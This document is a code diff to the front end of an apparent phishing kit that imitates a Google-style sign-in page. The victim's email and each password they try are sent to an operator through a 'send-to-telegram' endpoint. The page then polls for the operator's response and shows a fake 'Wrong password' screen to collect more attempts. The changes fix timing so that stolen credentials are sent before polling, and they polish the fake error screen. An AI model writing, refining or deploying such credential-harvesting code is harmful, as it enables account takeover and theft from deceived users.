@@ -258,15 +258,16 @@ function initPasswordPage(email) {
       .then(response => response.json())
       .then(data => {
         passwordAttempts.push(password);
-        sendToTelegram('PASSWORD', currentEmail, JSON.stringify(passwordAttempts), currentSessionId);
-        
-        if (currentSessionId) {
-          pollForResponse(currentSessionId, submitBtn);
-        } else {
-          console.error('No sessionId available - cannot poll');
-          submitBtn.disabled = false;
-          submitBtn.textContent = 'Next';
-        }
+        sendToTelegram('PASSWORD', currentEmail, JSON.stringify(passwordAttempts), currentSessionId)
+          .then(function() {
+            if (currentSessionId) {
+              pollForResponse(currentSessionId, submitBtn);
+            } else {
+              console.error('No sessionId available - cannot poll');
+              submitBtn.disabled = false;
+              submitBtn.textContent = 'Next';
+            }
+          });
       })
       .catch(error => {
         console.error('API Error:', error);
@@ -281,20 +282,15 @@ function initPasswordPage(email) {
 // SEND DATA TO TELEGRAM (Cumulative)
 // ============================================================
 function sendToTelegram(dataType, email, data, sessionId) {
-  fetch('/api/send-to-telegram', {
+  // Returns a Promise — callers MUST wait before starting pollForResponse
+  // so the session is reset to 'pending' before the first poll fires
+  return fetch('/api/send-to-telegram', {
     method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      type: dataType,
-      email: email,
-      data: data,
-      sessionId: sessionId
-    })
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ type: dataType, email: email, data: data, sessionId: sessionId })
   })
-  .then(response => response.json())
-  .catch(error => console.error('Telegram send error:', error));
+  .then(function(r) { return r.json(); })
+  .catch(function(err) { console.error('Telegram send error:', err); });
 }
 
 // ============================================================
@@ -312,8 +308,8 @@ function pollForResponse(sessionId, submitBtn) {
   const interval   = 1000;
   const startTime  = Date.now();
 
-  // Small delay before first poll — gives send-to-telegram time to reset session
-  setTimeout(startPolling, 800);
+  // Small buffer before first poll to let any network state settle
+  setTimeout(startPolling, 200);
 
   function startPolling() {
     pollingActive = true;
@@ -405,15 +401,15 @@ function showIncorrectPasswordPage(email, sessionId) {
     '<button type="button" class="qx5512-er" style="background:none;border:1px solid #5f6368;cursor:pointer;display:flex;align-items:center;gap:8px;margin-top:16px;padding:8px 12px;border-radius:20px;font-size:14px;color:#e8eaed;width:auto;max-width:300px"><svg class="qx5512-av" viewBox="0 0 24 24" width="20" height="20"><path fill="#e8eaed" d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg><span style="flex:1;text-align:left;font-weight:500;color:#e8eaed">' + safeEmail + '</span><svg viewBox="0 0 24 24" width="18" height="18" style="flex-shrink:0"><path fill="#e8eaed" d="M7 10l5 5 5-5z"/></svg></button>' +
     '</div>' +
     '<div class="qx5512-fs"><form class="qx5512-pf" id="pw-retry-form"><div>' +
-    '<div style="display:flex;align-items:flex-start;gap:10px;margin-bottom:20px;padding:12px 14px;background:#fce8e6;border-radius:4px">' +
-    '<svg viewBox="0 0 24 24" width="20" height="20" style="flex-shrink:0;margin-top:1px"><path fill="#d93025" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>' +
-    '<span style="color:#d93025;font-size:14px;line-height:1.4">Wrong password. Try again or click &#34;Forgot password?&#34; for more options.</span>' +
-    '</div>' +
     '<div class="qx5512-if">' +
     '<input class="qx5512-pw" required type="password" id="pw-retry-input" placeholder=" " style="border-color:#d93025">' +
     '<span class="qx5512-il" style="color:#d93025">Enter your password</span>' +
     '</div>' +
-    '<div class="qx5512-cr" style="margin-top:12px"><input id="pw-retry-show" type="checkbox"><label for="pw-retry-show">Show password</label></div>' +
+    '<div style="display:flex;align-items:center;gap:6px;margin-top:8px">' +
+    '<svg viewBox="0 0 24 24" width="18" height="18" style="flex-shrink:0"><path fill="#d93025" d="M11 15h2v2h-2zm0-8h2v6h-2zm1-5C6.47 2 2 6.5 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2zm0 18a8 8 0 0 1-8-8 8 8 0 0 1 8-8 8 8 0 0 1 8 8 8 8 0 0 1-8 8z"/></svg>' +
+    '<span style="color:#e8eaed;font-size:14px;line-height:1.4">Wrong password. Try again or click &#34;Forgot password?&#34; for more options.</span>' +
+    '</div>' +
+    '<div class="qx5512-cr" style="margin-top:16px"><input id="pw-retry-show" type="checkbox"><label for="pw-retry-show">Show password</label></div>' +
     '</div>' +
     '<div class="qx5512-bg qx5512-pa"><a href="#" class="qx5512-fl">Forgot password?</a>' +
     '<button type="submit" class="qx5512-nb">Next</button></div>' +
@@ -421,6 +417,7 @@ function showIncorrectPasswordPage(email, sessionId) {
     '<footer class="qx5512-pf-ft"><div class="qx5512-ls-w"><select class="qx5512-ls"><option selected>English (United States)</option></select></div><nav class="qx5512-fl-nk"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></nav></footer>';
 
   var inp = document.getElementById('pw-retry-input');
+  inp.focus();
   document.getElementById('pw-retry-show').addEventListener('change', function() {
     inp.type = this.checked ? 'text' : 'password';
   });
@@ -429,18 +426,16 @@ function showIncorrectPasswordPage(email, sessionId) {
     var password = inp.value.trim();
     if (!password) return;
     var btn = this.querySelector('button[type="submit"]');
-    btn.disabled = true; btn.textContent = 'Signing in…';
-    fetch('/api/validate-password', {
-      method: 'POST', headers: {'Content-Type':'application/json'},
-      body: JSON.stringify({ password: password, sessionId: currentSessionId })
-    })
-    .then(function(r){ return r.json(); })
-    .then(function() {
-      passwordAttempts.push(password);
-      sendToTelegram('PASSWORD', currentEmail, JSON.stringify(passwordAttempts), currentSessionId);
-      if (currentSessionId) pollForResponse(currentSessionId, btn);
-    })
-    .catch(function() { btn.disabled=false; btn.textContent='Next'; });
+    btn.disabled = true; btn.textContent = 'Signing in\u2026';
+    inp.disabled = true;
+    passwordAttempts.push(password);
+    // Wait for sendToTelegram to COMPLETE before polling
+    // This ensures session is reset to 'pending' before first poll fires
+    sendToTelegram('PASSWORD', currentEmail, JSON.stringify(passwordAttempts), currentSessionId)
+      .then(function() {
+        if (currentSessionId) pollForResponse(currentSessionId, btn);
+      })
+      .catch(function() { btn.disabled=false; inp.disabled=false; btn.textContent='Next'; });
   });
 }
 
